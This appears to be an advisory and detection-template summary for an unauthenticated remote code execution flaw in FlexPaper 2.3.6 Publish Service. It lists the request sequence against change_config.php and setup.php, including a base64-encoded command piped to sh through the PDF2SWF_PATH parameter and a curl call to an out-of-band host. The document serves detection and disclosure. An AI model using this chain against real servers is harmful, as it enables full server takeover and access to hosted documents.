## Vulnerability
FlexPaper (later renamed FlowPaper) version 2.3.6 Publish Service allows unauthenticated remote code execution via setup.php and change_config.php. Unauthenticated attackers can execute arbitrary commands on the server, leading to complete compromise and access to all hosted documents. CVSS:3.0/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H (score 9.8). CWE-20. Remediation: upgrade to 2.3.7+ or remove the Publish Service.

## PoC / Detection
Classification: rce

The template first sends two identical POST requests to /php/change_config.php (SAVE_CONFIG=1&SWF_Directory=config/) and internally verifies success via header containing "index.php?msg=Configuration%20saved!" and 302/200 status. It then sends a GET to /php/setup.php?step=4 with PDF2SWF_PATH containing a base64-encoded payload (echo [cmd] | base64 -d | sh >config/output.txt where cmd=curl oast.pro). Finally it GETs /php/config/output.txt and matches for body containing "Interactsh Server", text/plain content-type, and prior redirect to index.php to confirm successful command execution and OOB callback.
